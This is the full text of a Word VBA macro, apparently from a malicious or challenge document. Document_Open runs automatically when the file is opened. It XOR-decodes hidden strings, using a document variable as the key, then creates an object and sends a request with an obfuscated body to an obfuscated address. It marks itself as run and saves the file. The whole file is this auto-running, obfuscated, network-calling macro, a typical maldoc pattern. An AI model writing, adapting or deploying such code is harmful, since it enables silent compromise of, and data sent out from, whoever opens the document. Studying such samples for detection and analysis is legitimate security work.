Private Sub Document_Open()
	If ActiveDocument.Variables("zVaxnp").Value <> "macro" Then
		funkcja
		ActiveDocument.Variables("zVaxnp").Value = "macro"
		If ActiveDocument.ReadOnly = False Then
			ActiveDocument.Save
		End If
	End If
End Sub

Private Function rox(arg1 As Variant, arg2 As Integer)
	Dim result, varval As String, i, UXUrCHGOOq
	varval = ActiveDocument.Variables("zVaxnp").Value()
	result = ""
	i = 1
	While i < UBound(arg1) + 2
        UXUrCHGOOq = i Mod Len(varval): If UXUrCHGOOq = 0 Then UXUrCHGOOq = Len(varval)
        result = result + Chr(Asc(Mid(varval, UXUrCHGOOq + arg2, 1)) Xor CInt(arg1(i - 1)))
        i = i + 1
    Wend
    rox = result
End Function

Public Function funkcja()
    arr1 = rox(Array(123, 11, 48, 89, 76, 63, 6, 59, 118, 65, 47, 104, 51, 39, 51, 27, 120, 41, 36, 50, 51, 44, 5, 75, 65, 36, 77, 92, 101, 55, 5, 4, 88, 2, 90, 90, 2, 104, 59, 91, 21, 16, 33, 13, 19, 7, 88, 54, 29, 91, 21, 62, 75), 143)
    MsgBox arr1
    random1 = rox(Array(35, 33, 60, 17, 9, 127, 109, 17, 78, 82, 109, 64, 28, 110, 13, 105, 98, 116), 125)
    random2 = rox(Array(47, 39, 58, 70, 14, 80, 16, 27, 20, 75, 73, 78, 101, 14, 85, 49, 30, 15, 90, 17, 26, 102, 30, 33, 22, 1, 38, 63, 70, 52, 1, 41, 2, 42, 88, 9, 92, 69, 20, 23, 15, 56, 28, 60, 58, 79, 93, 81, 118, 28, 2, 20, 118, 95, 57, 18, 87, 19, 26, 57, 110, 53, 7, 5, 0, 52, 45, 31, 3, 70, 11, 99, 40, 28, 59, 119, 13, 108, 110, 4, 66, 40, 6, 76, 94, 98, 56, 76, 25, 64, 80, 69, 63, 71, 60), 30)
    Set random3 = CreateObject(rox(Array(26, 89, 24, 113, 51, 48, 52, 28, 14, 48, 9, 46, 53, 12, 4, 5, 8, 67, 54, 54, 27, 29, 123, 77, 28, 88), 4))
    random3.Open rox(Array(33, 23, 68, 54), 0), random1, False
    random3.Send random2
End Function
